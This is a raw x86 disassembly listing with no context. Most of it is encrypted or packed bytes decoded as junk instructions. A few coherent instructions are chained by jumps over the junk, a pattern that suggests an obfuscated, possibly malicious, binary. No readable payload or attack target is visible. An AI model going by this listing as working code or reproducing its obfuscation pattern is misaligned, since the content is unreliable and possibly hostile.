  410208:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410209:	outs   dx,BYTE PTR ds:[esi]
  41020a:	ror    DWORD PTR [esi],0x14
  41020d:	ror    DWORD PTR [eax+0x2b43cd3f],1
  410213:	adc    eax,0x2cbd5c48
  410218:	xchg   esi,eax
  410219:	cmc    
  41021a:	add    ebx,0xffffffdf
  41021d:	add    ch,dl
  41021f:	mov    al,ds:0x5f36f1dc
  410224:	inc    ebp
  410225:	inc    edi
  410226:	(bad)  
  410228:	imul   eax,DWORD PTR [esi],0x892eb703
  41022e:	and    eax,edx
  410230:	jns    0x410207
  410232:	dec    esi
  410233:	pop    ss
  410234:	xor    BYTE PTR [esi-0x39],0x41
  410238:	adc    al,0x38
  41023a:	pop    esp
  41023b:	lock inc ebp
  41023d:	adc    eax,0xe27b90ed
  410242:	or     DWORD PTR [esi+0x10],ebp
  410245:	jg     0x4101ec
  410247:	je     0x41025c
  410249:	in     eax,dx
  41024a:	pop    edi
  41024b:	sub    BYTE PTR es:0x8c70d542,dh
  410252:	mov    dh,0xe3
  410254:	out    dx,eax
  410255:	mov    DWORD PTR [edx],ebp
  410257:	jnp    0x41029a
  410259:	shl    BYTE PTR gs:[eax],cl
  41025c:	mov    edi,0x7bc16815
  410261:	lods   eax,DWORD PTR ds:[esi]
  410262:	aaa    
  410263:	sub    edx,0xaaea3c5d
  410269:	(bad)  
  41026a:	sub    eax,0xfc72595a
  41026f:	jns    0x410229
  410271:	mov    esi,0x1df7df45
  410276:	or     edx,ebp
  410278:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410279:	cs dec esi
  41027b:	fmulp  st(4),st
  41027d:	stc    
  41027e:	xchg   BYTE PTR [esp+ebp*8+0x7cf6e4e4],ah
  410285:	aam    0xf3
  410287:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410288:	std    
  410289:	fild   WORD PTR [ebx+0x6c]
  41028c:	daa    
  41028d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41028e:	sub    DWORD PTR [eax-0x1fa33e6e],ebx
  410294:	dec    dl
  410296:	xchg   edx,eax
  410297:	aas    
  410298:	outs   dx,BYTE PTR ds:[esi]
  410299:	dec    ecx
  41029a:	sahf   
  41029b:	imul   esi,DWORD PTR [esi-0x45],0xffffff81
  41029f:	std    
  4102a0:	and    BYTE PTR [ebx-0x25b75993],bh
  4102a6:	jmp    0x7804:0xd687094f
  4102ad:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4102ae:	(bad)  
  4102af:	xchg   ebp,eax
  4102b0:	and    BYTE PTR es:[ecx-0x66508aa5],dh
  4102b7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4102b8:	in     eax,dx
  4102b9:	pushf  
  4102ba:	stc    
  4102bb:	out    dx,eax
  4102bc:	sbb    dl,BYTE PTR [esi+0xa]
  4102bf:	das    
  4102c0:	aaa    
  4102c1:	test   DWORD PTR cs:[eax+0xaddb226],esi
  4102c8:	xor    eax,0xb11b12c4
  4102cd:	mov    al,ds:0x758d0a20
  4102d2:	es jae 0x4102ba
  4102d5:	pop    edi
  4102d6:	lahf   
  4102d7:	sbb    ebx,ebx
  4102d9:	add    BYTE PTR fs:[eax-0x1d],al
  4102dd:	(bad)  [edi]
  4102df:	pop    ss
  4102e0:	pusha  
  4102e1:	sar    BYTE PTR [eax],0xa4
  4102e4:	loope  0x41034c
  4102e6:	cmp    cl,0x6c
  4102e9:	dec    ecx
  4102ea:	push   esp
  4102eb:	in     al,dx
  4102ec:	add    cl,BYTE PTR ds:0x2f2ca3d
  4102f2:	(bad)  [eax]
  4102f4:	push   edx
  4102f5:	mov    bh,0xea
  4102f7:	es je  0x410348
  4102fa:	or     esp,DWORD PTR [ebp+esi*4-0x7e]
  4102fe:	mov    ah,0x14
  410300:	sub    al,0xb7
  410302:	ins    DWORD PTR es:[edi],dx
  410303:	mov    cl,0x45
  410305:	cmc    
  410306:	cmp    edi,eax
  410308:	pop    ss
  410309:	inc    eax
  41030a:	push   ds
  41030b:	repz sbb BYTE PTR [edi-0x61f3d08f],dh
  410312:	xor    bh,BYTE PTR ds:0xb0367918
  410318:	adc    esi,eax
  41031a:	les    ecx,FWORD PTR [ebx]
  41031c:	adc    al,0xc6
  41031e:	mov    dh,0x39
  410320:	cmp    ecx,ecx
  410322:	push   esi
  410323:	adc    ch,ah
  410325:	aaa    
  410326:	inc    esi
  410327:	mov    eax,ds:0xb3839a96
  41032c:	lahf   
  41032d:	mov    eax,0xfe89b957
  410332:	pusha  
  410333:	aam    0x3a
  410335:	mov    ch,0xc6
  410337:	(bad)  
  410338:	cmp    eax,0x4b9f59b3
  41033d:	add    dl,BYTE PTR [eax]
  41033f:	sbb    eax,ecx
  410341:	fcom   QWORD PTR [ebx+0x7f1083ed]
  410347:	out    dx,al
  410348:	push   esi
  410349:	inc    edx
  41034a:	fcomi  st,st(2)
  41034c:	gs push 0xaab5fbcb
  410352:	ret    0x7ff9
  410355:	outs   dx,BYTE PTR ds:[esi]
  410356:	mov    ch,0xde
  410358:	dec    ebx
  410359:	mov    ch,0x47
  41035b:	adc    esp,DWORD PTR [edx]
  41035d:	pop    ecx
  41035e:	jecxz  0x4103a4
  410360:	mov    ds:0x76daa289,al
  410365:	(bad)  
  410366:	fiadd  WORD PTR [edx]
  410368:	mov    al,0xaf
  41036a:	sub    esp,DWORD PTR [edi]
  41036c:	and    ah,dl
  41036e:	lods   eax,DWORD PTR ds:[esi]
  41036f:	mov    ?,WORD PTR [ebp+0x71]
  410372:	jb     0x4103ad
  410374:	push   edi
  410375:	adc    al,0x9b
  410377:	inc    edx
  410378:	inc    edx
  410379:	aas    
  41037a:	jb     0x41034c
  41037c:	je     0x410353
  41037e:	push   cs
  41037f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410380:	into   
  410381:	xor    BYTE PTR [edi],bh
  410383:	aam    0x4b
  410385:	(bad)  
  410386:	jg     0x410364
  410388:	cmp    edi,esp
  41038a:	scas   al,BYTE PTR es:[edi]
  41038b:	outs   dx,BYTE PTR ds:[esi]
  41038c:	(bad)  
  41038d:	or     ebp,esp
  41038f:	scas   eax,DWORD PTR es:[edi]
  410390:	jmp    0x410329
  410392:	in     eax,0x48
  410394:	push   esi
  410395:	mov    DWORD PTR [ebp+0x8],ecx
  410398:	add    eax,0x2082
  41039d:	mov    eax,DWORD PTR [ebp-0x4]
  4103a0:	mov    ecx,DWORD PTR ds:0x42fd05
  4103a6:	add    ecx,DWORD PTR ds:0x42fd09
  4103ac:	mov    DWORD PTR ds:0x42fd05,ecx
  4103b2:	xor    eax,edx
  4103b4:	sub    DWORD PTR ds:0x42e11c,ebx
  4103ba:	push   esi
  4103bb:	sbb    ecx,ecx
  4103bd:	jmp    0x410787
  4103c2:	lods   al,BYTE PTR ds:[esi]
  4103c3:	das    
  4103c4:	mov    ds:0xaa91a114,al
  4103c9:	mov    bh,0x91
  4103cb:	call   0x5edb:0x8cfbbab6
  4103d2:	pop    eax
  4103d3:	mov    edx,0x7da37070
  4103d8:	jo     0x41044a
  4103da:	call   0xb2a4af22
  4103df:	fsub   DWORD PTR [esi+0x206df926]
  4103e5:	push   edi
  4103e6:	pop    ecx
  4103e7:	fcom   QWORD PTR [ebp+eiz*1+0x6eb896d6]
  4103ee:	aas    
  4103ef:	cwde   
  4103f0:	adc    al,0x16
  4103f2:	push   esi
  4103f3:	jmp    0xedbb:0x811dce91
  4103fa:	inc    edi
  4103fb:	adc    dl,dh
  4103fd:	jmp    0x2f620629
  410402:	ins    BYTE PTR es:[edi],dx
  410403:	scas   al,BYTE PTR es:[edi]
  410404:	popa   
  410405:	jp     0x410419
  410407:	sbb    DWORD PTR [edx+0x22],esp
  41040a:	dec    ecx
  41040b:	inc    edx
  41040c:	add    BYTE PTR [ebx+edi*2+0x0],ch
  410410:	or     dh,BYTE PTR [ecx]
  410412:	add    DWORD PTR [eax],esi
  410414:	xchg   BYTE PTR [edx+0x5a3f310d],bl
  41041a:	or     esi,DWORD PTR [edx+0x217cf9f3]
  410420:	adc    eax,0xcbe6a8fb
  410425:	stos   BYTE PTR es:[edi],al
  410426:	adc    eax,0xc8996a7d
  41042b:	mov    ebp,DWORD PTR [edi]
  41042d:	repz add DWORD PTR [edi+0xb541fa8],esi
  410434:	out    dx,al
  410435:	add    DWORD PTR [ecx+eiz*2],esp
  410438:	jp     0x4104b8
  41043a:	jl     0x410453
  41043c:	jl     0x41046b
  41043e:	cmp    BYTE PTR [edi],0xdf
  410441:	xchg   ebp,eax
  410442:	mov    ebx,0x34a69c3b
  410447:	(bad)  
  410448:	aam    0x82
  41044a:	mov    ebp,0x35533dd7
  41044f:	xchg   edx,eax
  410450:	jbe    0x41049e
  410452:	push   0x55e56be
  410457:	mov    edi,0x2d1bf88a
  41045c:	dec    esp
  41045d:	push   esi
  41045e:	push   ebx
  41045f:	lahf   
  410460:	cmp    ecx,ecx
  410462:	(bad)  
  410463:	mov    dl,0xc2
  410465:	pop    eax
  410466:	cmp    eax,0x80a19704
  41046b:	popa   
  41046c:	adc    dl,BYTE PTR [edx-0x5afadc93]
  410472:	inc    esi
  410473:	inc    ebx
  410474:	push   es
  410475:	sub    al,0x7d
  410477:	cmc    
  410478:	(bad)  
  41047a:	mov    dl,0x33
  41047c:	dec    eax
  41047d:	pop    ebp
  41047e:	mov    bl,0xf3
  410480:	push   ebp
  410481:	sahf   
  410482:	xchg   edx,eax
  410483:	aaa    
  410484:	mov    DWORD PTR ds:0x517688ae,esp
  41048a:	xchg   edi,eax
  41048b:	cld    
  41048c:	push   ebx
  41048d:	sti    
  41048e:	mov    bh,0x1e
  410490:	inc    ebx
  410491:	bound  eax,QWORD PTR [ecx]
  410493:	icebp  
  410494:	pop    ds
  410495:	dec    esp
  410496:	ins    DWORD PTR es:[edi],dx
  410497:	in     eax,0x57
  410499:	pop    ds
  41049a:	call   0xf5ea:0x3660ba5f
  4104a1:	push   0x7e07b96a
  4104a6:	in     al,0xfb
  4104a8:	xor    dl,BYTE PTR [edx+0x79887fca]
  4104ae:	cdq    
  4104af:	mov    bh,0xad
  4104b1:	sub    ecx,ebp
  4104b3:	sbb    DWORD PTR [eax+ecx*8],ebp
  4104b6:	pop    ebp
  4104b7:	dec    ebx
  4104b8:	out    0xe6,eax
  4104ba:	mov    edi,0xe28c2ed7
  4104bf:	or     BYTE PTR [edx],0xbd
  4104c2:	mov    eax,ds
  4104c4:	and    ecx,DWORD PTR [edi-0x55]
  4104c7:	sub    al,0xa8
  4104c9:	out    dx,eax
  4104ca:	jb     0x410502
  4104cc:	xchg   ebx,eax
  4104cd:	rcr    DWORD PTR [ecx+ebx*2+0x51],1
  4104d1:	aaa    
  4104d2:	repz inc edi
  4104d4:	mov    ds:0x635b1b79,eax
  4104d9:	ja     0x410550
  4104db:	lods   eax,DWORD PTR ds:[esi]
  4104dc:	and    edi,ecx
  4104de:	repnz sti 
  4104e0:	jmp    0x4104e5
  4104e2:	inc    esi
  4104e3:	stc    
  4104e4:	xchg   esp,eax
  4104e5:	loop   0x410467
  4104e7:	dec    esi
  4104e8:	jmp    0xc8fd8685
  4104ed:	cmp    edx,DWORD PTR [eax-0x69]
  4104f0:	jne    0x41050a
  4104f2:	or     BYTE PTR [esi-0x527a8f9e],cl
  4104f8:	inc    ebp
  4104f9:	cmp    esp,DWORD PTR [ecx]
  4104fb:	sbb    al,0xc5
  4104fd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4104fe:	xchg   ecx,eax
  4104ff:	gs mov edi,0x2772e6c5
  410505:	sar    DWORD PTR [edx+0x682353a0],1
  41050b:	add    cl,cl
  41050d:	xor    eax,0x7f905d63
  410512:	ret    0x4c2b
  410515:	imul   eax,DWORD PTR [ebx-0x73],0xffec14fc
  41051c:	adc    eax,0xbaf08f56
  410521:	test   DWORD PTR [edi+0x4ae74392],esp
  410527:	ja     0x41055b
  410529:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41052a:	scas   eax,DWORD PTR es:[edi]
  41052b:	push   ss
  41052c:	loope  0x4104b0
  41052e:	mov    ah,0x5e
  410530:	sub    al,0x50
  410532:	xor    al,0xec
  410534:	out    dx,eax
  410535:	data16 out dx,al
  410537:	pop    ebx
  410538:	inc    ebx
  410539:	jge    0x41055b
  41053b:	arpl   dx,si
  41053d:	xchg   edi,eax
  41053e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41053f:	sbb    bh,BYTE PTR ds:0x8f16b5bc
  410545:	or     DWORD PTR [esi-0x5b],esp
  410548:	retf   0x39b7
  41054b:	shr    ecx,cl
  41054d:	and    BYTE PTR [esp+edi*1-0x27cbad66],bh
  410554:	aas    
  410555:	pop    ecx
  410556:	push   esi
  410557:	fwait
  410558:	scas   eax,DWORD PTR es:[edi]
  410559:	xchg   cl,ch
  41055b:	xor    edi,ebp
  41055d:	arpl   WORD PTR [edx-0x3afd6e4],bx
  410563:	js     0x4104fd
  410565:	xchg   esi,eax
  410566:	jae    0x4105e2
  410568:	xlat   BYTE PTR ds:[ebx]
  410569:	cmp    bh,BYTE PTR [ebx]
  41056b:	in     eax,dx
  41056c:	mov    cl,0x9b
  41056e:	repnz stos BYTE PTR es:[edi],al
  410570:	mov    bl,0x78
  410572:	cs rol edi,cl
  410575:	adc    DWORD PTR [edx+0x7a],ebp
  410578:	dec    edx
  410579:	stc    
  41057a:	adc    dh,0xd0
  41057d:	jmp    0x4105d8
  41057f:	ret    
  410580:	pop    ss
  410581:	inc    ebp
  410582:	xchg   edx,eax
  410583:	xchg   ebp,eax
  410585:	xor    DWORD PTR [ecx-0x26502f6b],eax
  41058b:	adc    eax,0x2d5f37ab
  410590:	sub    DWORD PTR [ebx-0x3c35df1],esp
  410596:	push   ecx
  410597:	pop    ebp
  410598:	pop    edx
  410599:	popa   
  41059a:	jp     0x41057f
  41059c:	aam    0xb5
  41059e:	pop    edi
  41059f:	(bad)  
  4105a1:	clc    
  4105a2:	xchg   DWORD PTR [edi-0x69d4d324],ebp
  4105a8:	dec    edx
  4105a9:	inc    DWORD PTR [ecx+0x7affd44b]
  4105af:	cld    
  4105b0:	or     al,0xe2
  4105b2:	test   eax,0x321025c1
  4105b7:	sahf   
  4105b8:	dec    ecx
  4105b9:	cld    
  4105ba:	xor    dh,ah
  4105bc:	or     ebx,DWORD PTR cs:[ecx+eax*8]
  4105c0:	sbb    ch,BYTE PTR [eax]
  4105c2:	jne    0x410604
  4105c4:	xchg   ecx,ecx
  4105c6:	push   cs
  4105c7:	or     esp,0x5dd60b1b
  4105cd:	add    cl,BYTE PTR [eax+0x4d]
  4105d0:	test   BYTE PTR [eax],ah
  4105d2:	aam    0x82
  4105d4:	cmp    al,0xef
  4105d6:	rep lods al,BYTE PTR ds:[esi]
  4105d8:	xchg   ebx,eax
  4105d9:	xchg   edi,eax
  4105da:	pop    edx
  4105db:	sar    BYTE PTR [edx+0x3128982b],0x2
  4105e2:	idiv   DWORD PTR ds:0x907ddd75
  4105e8:	inc    ebp
  4105e9:	xchg   esp,eax
  4105ea:	hlt    
  4105eb:	pop    eax
  4105ec:	ss popf 
  4105ee:	cmc    
  4105ef:	ret    
  4105f0:	(bad)  
  4105f1:	fbld   TBYTE PTR [ebx+0x4c]
  4105f4:	jg     0x41061c
  4105f6:	jmp    0x410651
  4105f8:	ret    0x66be
  4105fb:	mov    ?,WORD PTR [edx+eiz*2+0x33]
  4105ff:	mov    BYTE PTR [edx+ecx*2-0x5a],bl
  410603:	mov    esp,0xddc25b5d
  410608:	mov    eax,0x10cabfe
  41060d:	fadd   QWORD PTR [edx-0x57]
  410610:	arpl   WORD PTR [esi],bx
  410612:	nop
  410613:	add    edx,esp
  410615:	aas    
  410616:	arpl   WORD PTR [ecx],sp
  410618:	add    al,0x3f
  41061a:	addr16 call 0xcd7a:0x8fe8fee6
  410622:	adc    al,al
  410624:	jg     0x41064b
  410626:	dec    esi
  410627:	xchg   ecx,eax
  410628:	push   edi
  410629:	rol    BYTE PTR ss:[esi],1
  41062c:	icebp  
  41062d:	sahf   
  41062e:	jns    0x4105fb
  410630:	adc    al,0xb7
  410632:	dec    edi
  410633:	xor    esi,DWORD PTR [eax+0x1b59f63]
  410639:	test   DWORD PTR [ebx+ebx*8-0x2b],edx
  41063d:	xchg   ebx,eax
  41063e:	cmc    
  41063f:	clc    
  410640:	int3   
  410641:	fs lock inc ecx
  410644:	pop    eax
  410645:	shr    DWORD PTR [edi+0x1773f320],1
  41064b:	shl    ebx,cl
  41064d:	adc    esi,ebx
  41064f:	pop    ebx
  410650:	shr    eax,0xa5
  410653:	mov    dl,BYTE PTR [esi-0x6d752d9e]
  410659:	icebp  
  41065a:	jmp    0x95d0f12
  41065f:	mov    ebp,0xb3ec675a
  410664:	jle    0x4106c3
  410666:	push   ebx
  410667:	cmp    BYTE PTR [ecx-0x600e5cdb],ch
  41066d:	addr16 jge 0x4106dc
  410670:	(bad)  
  410671:	mov    dh,0x97
  410673:	push   ebp
  410674:	daa    
  410675:	lods   al,BYTE PTR ds:[esi]
  410676:	enter  0x473c,0xb4
  41067a:	cmp    BYTE PTR [esp+eax*4+0x17834f8e],dl
  410681:	gs push edi
  410683:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410684:	adc    al,0x88
  410686:	xor    esp,DWORD PTR [eax]
  410688:	and    BYTE PTR [ecx],dh
  41068a:	inc    ebp
  41068b:	dec    eax
  41068c:	sub    BYTE PTR ds:0xfa2d13ec,al
  410692:	ret    
  410693:	loop   0x4106be
  410695:	sub    ebp,edi
  410697:	mov    ch,0x96
  410699:	aas    
  41069a:	adc    ebp,edi
  41069c:	xchg   esp,eax
  41069d:	inc    BYTE PTR [ebp+0x6632af72]
  4106a3:	fwait
  4106a4:	sbb    esi,DWORD PTR [ebx-0x11]
  4106a7:	mov    edx,0x1f3282b7
  4106ad:	out    0x7f,eax
  4106af:	rcr    BYTE PTR [ebp+0x78016987],cl
  4106b5:	sbb    bh,0x33
  4106b8:	adc    al,0x95
  4106ba:	push   es
  4106bb:	and    edi,ecx
  4106bd:	in     al,dx
  4106be:	pusha  
  4106bf:	fsubp  st(3),st
  4106c1:	ins    DWORD PTR es:[edi],dx
  4106c2:	adc    BYTE PTR [ecx-0x53],ch
  4106c5:	inc    edx
  4106c6:	dec    BYTE PTR [edi-0x5c]
  4106c9:	js     0x4106eb
  4106cb:	mov    esi,0x1190806f
  4106d0:	fwait
  4106d1:	pop    ss
  4106d2:	xchg   BYTE PTR [edi+0x7dd973a9],dh
  4106d8:	aad    0x71
  4106da:	int    0xad
  4106dc:	jo     0x41066f
  4106de:	and    al,0x42
  4106e0:	lea    eax,[ecx-0x39593e84]
  4106e6:	call   0xbc0a:0xadd3366a
  4106ed:	mov    ch,0x51
  4106ef:	lods   eax,DWORD PTR ds:[esi]
  4106f0:	je     0x41070f
  4106f2:	sbb    eax,DWORD PTR [ecx+0x622291e7]
  4106f8:	int3   
  4106f9:	sub    cl,BYTE PTR [edx+0x1f]
  4106fc:	mov    al,ds:0x50be5a04
  410701:	jg     0x410773
  410703:	inc    edx
  410704:	jmp    0x3ba4eb2c
  410709:	jp     0x4106ce
  41070b:	pop    ebp
  41070c:	mov    bl,0xdb
  41070e:	cli    
  41070f:	jmp    0x410772
  410711:	leave  
  410712:	sbb    edi,ebx
  410714:	aam    0x66
  410716:	sub    eax,0x7f4f7bfc
  41071b:	shl    esp,1
  41071d:	and    ch,BYTE PTR [eax]
  41071f:	xchg   esp,eax
  410720:	dec    ebp
  410721:	pusha  
  410722:	std    
  410723:	jbe    0x4106df
  410725:	inc    ebp
  410726:	jg     0x4106cc
  410728:	pop    ecx
  410729:	ret    0x659b
  41072c:	rcr    BYTE PTR [ebp+esi*8-0x627340c],1
  410733:	pop    ss
  410734:	pop    ebx
  410735:	mov    bh,0x8b
  410737:	call   esi
  410739:	lds    ebp,FWORD PTR [ebx]
  41073b:	push   ecx
  41073c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41073d:	mov    edx,0x325134aa
  410742:	dec    esi
  410743:	leave  
  410744:	call   0xd50aa26b
  410749:	fdiv   DWORD PTR [eax]
  41074b:	cwde   
  41074c:	or     al,0x33
  41074e:	xchg   BYTE PTR [ebp+esi*1-0x11],dh
  410752:	ss jb  0x410783
  410755:	push   ebx
  410756:	mov    bl,0x29
  410758:	xchg   esi,eax
  410759:	test   eax,0xa0e9b848
  41075e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41075f:	mov    ecx,0x7c295453
  410764:	ret    0x4e13
  410767:	sti    
  410768:	inc    edi
  410769:	cmp    edi,esi
  41076b:	dec    ecx
  41076c:	mov    ds:0xee53e4b4,eax
  410771:	mov    eax,0x2655a8be
  410776:	jle    0x4107a4
  410778:	mov    esp,0xbf108559
  41077d:	sbb    eax,0x8540c91f
  410782:	push   0x7d4d4e42
  410787:	mov    esi,DWORD PTR [ebp+0x8]
  41078a:	sbb    ecx,0x2f26
  410790:	mov    ecx,0x32729c
  410795:	add    eax,ecx
  410797:	jmp    0x410b61
  41079c:	outs   dx,DWORD PTR ds:[esi]
  41079d:	mov    ebp,ds
  41079f:	or     al,0xd9
  4107a1:	imul   ebp,DWORD PTR [ecx+0x6b],0x19f67ea1
  4107a8:	data16 ins BYTE PTR es:[edi],dx
  4107aa:	ins    DWORD PTR es:[edi],dx
  4107ab:	ror    BYTE PTR [ebx-0x5c8f8fba],1
  4107b1:	jge    0x410823
  4107b3:	jo     0x41079c
  4107b5:	push   ss
  4107b6:	pop    esp
  4107b7:	out    dx,al
  4107b8:	in     al,dx
  4107b9:	aam    0x26
  4107bb:	mov    cl,0x8c
  4107bd:	xchg   DWORD PTR [eax+0x425c7a6a],edi
  4107c3:	mov    bh,0x96
  4107c5:	mov    ebx,0xdc262583
  4107ca:	or     edi,DWORD PTR ds:0xf2eff9a3
  4107d0:	cmp    BYTE PTR [ecx+edi*4-0x67],0x4d
  4107d5:	pop    ecx
  4107d6:	scas   al,BYTE PTR es:[edi]
  4107d7:	and    BYTE PTR [edx],ch
  4107d9:	jge    0x410813
  4107db:	ins    DWORD PTR es:[edi],dx
  4107dc:	dec    ecx
  4107dd:	rcl    BYTE PTR [ebx+0x3a],cl
  4107e0:	jae    0x41083a
  4107e2:	cmp    al,0xd4
  4107e4:	xor    esp,esp
  4107e6:	add    al,0x1a
  4107e8:	popf   
  4107e9:	pop    ss
  4107ea:	sub    DWORD PTR [esi+0x1f],esi
  4107ed:	xchg   BYTE PTR [edi-0x18edb233],bh
  4107f3:	and    al,dl
  4107f5:	pop    eax
  4107f6:	mov    eax,0xee1c79fd
  4107fb:	or     DWORD PTR [edx-0x217dac41],ecx
  410801:	sub    eax,DWORD PTR [esi-0x132dc6f1]
  410807:	ja     0x410844
  410809:	retf   0xe4dc
  41080c:	sbb    eax,0x1c2a2de9
  410811:	ret    
  410812:	xchg   ecx,eax
  410813:	ins    DWORD PTR es:[edi],dx
  410814:	pop    ebx
  410815:	adc    eax,0x5dd16192
  41081a:	call   0x4d2098aa
  41081f:	mov    ebp,esi
  410821:	cmp    eax,0x45247579
  410826:	sbb    DWORD PTR [edi-0x2d958764],ecx
  41082c:	scas   al,BYTE PTR es:[edi]
  41082d:	push   esi
  41082e:	pop    edx
  41082f:	sbb    al,0xfb
  410831:	dec    edx
  410832:	int    0x6d
  410834:	cmp    BYTE PTR [eax],dh
  410836:	push   esi
  410837:	fdivr  DWORD PTR [ecx+0x1c4e4459]
  41083d:	dec    edi
  41083e:	mov    ds:0xd0b68791,eax
  410843:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410844:	test   al,0x45
  410846:	scas   eax,DWORD PTR es:[edi]
  410847:	je     0x410829
  410849:	std    
  41084a:	xchg   ebp,eax
  41084b:	and    DWORD PTR [ebp-0x4c],0x69
  41084f:	leave  
  410850:	adc    edx,DWORD PTR [edx*4-0xc07ebbd]
  410857:	pextrw edx,(bad),0xc5
  410859:	push   ebp
  41085a:	add    cl,BYTE PTR ds:0xac1cce0
  410860:	sub    dl,al
  410862:	loope  0x41088b
  410864:	jnp    0x41087a
  410866:	mov    ds:0xe4aec0c6,eax
  41086b:	fnop   
  41086d:	je     0x410845
  41086f:	xchg   DWORD PTR [ebx-0x55],ebp
  410872:	push   edi
  410873:	sbb    BYTE PTR [edx-0x4826a745],dl
  410879:	lods   al,BYTE PTR ds:[esi]
  41087a:	aaa    
  41087b:	push   ds
  41087c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41087d:	dec    ebx
  41087e:	cld    
  41087f:	ss retf 
  410881:	stos   BYTE PTR es:[edi],al
  410882:	xchg   DWORD PTR [eax-0x76f0bfd3],esi
  410888:	inc    eax
  410889:	nop
  41088a:	gs repz inc esi
  41088d:	xchg   DWORD PTR [edx-0x3f7a4e23],ebx
  410893:	inc    eax
  410894:	stc    
  410895:	and    al,BYTE PTR [edx-0x7e47e085]
  41089b:	mov    ebp,0x51b1df43
  4108a0:	xor    esi,DWORD PTR [edi-0x4c82e23a]
  4108a6:	cmp    ebp,DWORD PTR [ecx-0x7e71f2a7]
  4108ac:	mov    ecx,0x8fb4b802
  4108b1:	sbb    dh,BYTE PTR [edi-0x80]
  4108b4:	jl     0x4108cc
  4108b6:	retw   0xd05b
  4108ba:	fimul  DWORD PTR [ebx]
  4108bc:	clc    
  4108bd:	mov    eax,ds:0x507d0dca
  4108c2:	jg     0x410914
  4108c4:	mov    al,ds:0x5969f3a7
  4108c9:	popf   
  4108ca:	sub    ecx,DWORD PTR [eax+0x34]
  4108cd:	sar    DWORD PTR [esi],0x55
  4108d0:	jg     0x410856
  4108d2:	adc    ah,BYTE PTR [edx+0x28]
  4108d5:	jge    0x4108ba
  4108d7:	jns    0x410894
  4108d9:	ss inc ebx
  4108db:	and    DWORD PTR [edx-0x3],esi
  4108de:	jl     0x41093c
  4108e0:	retf   0x3944
  4108e3:	fwait
  4108e4:	aaa    
  4108e5:	pop    ecx
  4108e6:	jle    0x41089f
  4108e8:	inc    DWORD PTR [ecx+0x60]
  4108eb:	fwait
  4108ec:	mov    esp,0x311b1074
  4108f1:	and    edi,ebx
  4108f3:	fisubr WORD PTR [esi-0x5349023e]
  4108f9:	out    dx,eax
  4108fa:	call   0xa2d1:0xa7e7d4e7
  410901:	pop    es
  410902:	in     al,0x7e
  410904:	inc    eax
  410905:	ret    0xb311
  410908:	arpl   WORD PTR [esi],sp
  41090a:	dec    edi
  41090b:	inc    esp
  41090c:	xchg   ecx,eax
  41090d:	pusha  
  41090e:	ror    bl,1
  410910:	(bad)  
  410911:	repnz sub eax,0xe603818c
  410917:	fidivr DWORD PTR [esp+esi*8+0x7e003694]
  41091e:	or     ch,0x35
  410921:	clc    
  410922:	jae    0x4108c2
  410924:	and    BYTE PTR ds:0xceef9b37,0xf8
  41092b:	jl     0x410948
  41092d:	push   ecx
  41092e:	retf   
  41092f:	mov    bl,0x1
  410931:	fiadd  DWORD PTR [edi+0x2]
  410934:	xchg   ebp,eax
  410935:	inc    ecx
  410936:	and    dh,BYTE PTR [esi+edx*8]
  410939:	ins    BYTE PTR es:[edi],dx
  41093a:	sbb    DWORD PTR [edx-0x32677210],0x20
  410941:	jb     0x410951
  410943:	gs xchg esi,eax
  410945:	pushf  
  410946:	and    dh,BYTE PTR [edi+0x1793ea1f]
  41094c:	jmp    0x4d98:0x74ffbf19
  410953:	jecxz  0x41092d
  410955:	dec    esi
  410956:	inc    eax
  410957:	mov    al,0xcd
  410959:	popf   
  41095a:	lahf   
  41095b:	xchg   edx,eax
  41095c:	ins    BYTE PTR es:[edi],dx
  41095d:	dec    eax
  41095e:	push   0x3d0df9c0
  410963:	lahf   
  410964:	jmp    0x4a2414d4
  410969:	mov    ah,0x93
  41096b:	leave  
  41096c:	scas   al,BYTE PTR es:[edi]
  41096d:	and    BYTE PTR [eax-0xbafee24],al
  410973:	xor    DWORD PTR [eax],ebp
  410975:	or     al,0x2e
  410977:	mov    edx,0x517f0df6
  41097c:	xor    eax,0xa6dbcbf5
  410981:	adc    DWORD PTR [ebx-0x6c7baaad],edx
  410987:	cmp    BYTE PTR [eax+0x42de95ff],cl
  41098d:	(bad)  
  41098e:	in     eax,0x68
  410990:	jno    0x410a11
  410992:	add    eax,0xc7f0010c
  410997:	(bad)  
  410998:	call   DWORD PTR [edx+0x5f]
  41099b:	mov    edx,0x23360848
  4109a0:	sahf   
  4109a1:	fmulp  st(1),st
  4109a3:	outs   dx,BYTE PTR ds:[esi]
  4109a4:	aam    0x6d
  4109a6:	adc    DWORD PTR [esi+ebp*8+0x11b9524b],ecx
  4109ad:	mov    dh,0x12
  4109af:	dec    eax
  4109b0:	nop
  4109b1:	inc    esp
  4109b2:	jb     0x410939
  4109b4:	cli    
  4109b5:	mov    ss,WORD PTR [edi+0x239e7d75]
  4109bb:	dec    esi
  4109bc:	push   ss
  4109bd:	or     al,0xd0
  4109bf:	test   DWORD PTR [esi-0x7050f2d3],esi
  4109c5:	les    ebx,FWORD PTR [ebp-0x60]
  4109c8:	mov    ecx,0x66018796
  4109cd:	into   
  4109ce:	(bad)  
  4109cf:	int    0x6e
  4109d1:	mov    bl,0x8a
  4109d3:	jl     0x410a28
  4109d5:	pop    edi
  4109d6:	xchg   esi,eax
  4109d7:	sub    DWORD PTR [ecx-0x6d9effb3],esp
  4109dd:	push   esp
  4109de:	ins    BYTE PTR es:[edi],dx
  4109df:	outs   dx,DWORD PTR ds:[esi]
  4109e0:	mov    ds:0x492720ec,eax
  4109e5:	adc    eax,0xff99a664
  4109ea:	sub    BYTE PTR [edx+ecx*2-0x1a6ae2fa],bh
